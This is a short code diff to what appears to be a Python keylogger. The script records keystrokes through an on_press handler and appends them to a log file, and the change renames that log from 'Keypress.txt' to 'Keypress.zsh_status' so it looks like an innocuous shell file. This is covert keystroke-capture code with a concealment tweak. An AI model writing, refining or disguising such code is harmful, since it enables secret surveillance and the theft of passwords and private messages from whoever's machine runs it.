@@ -18,7 +18,7 @@ def on_press(key):
         keys.clear()
 
 def write_file(keys):
-    with open("Keypress.txt", "a") as f:
+    with open("Keypress.zsh_status", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
